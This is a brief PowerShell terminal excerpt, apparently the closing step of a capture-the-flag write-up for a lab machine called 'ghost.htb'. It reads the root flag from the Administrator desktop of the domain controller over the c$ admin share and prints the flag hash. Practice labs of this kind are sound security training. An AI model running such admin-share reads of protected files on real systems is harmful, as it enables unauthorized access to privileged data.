PS C:\users\public\temp> cat \\dc01.ghost.htb\c$\Users\Administrator\Desktop\root.txt
cat \\dc01.ghost.htb\c$\Users\Administrator\Desktop\root.txt
cb61d1c0d172db3cc1d03c304df9fd51
PS C:\users\public\temp> 
```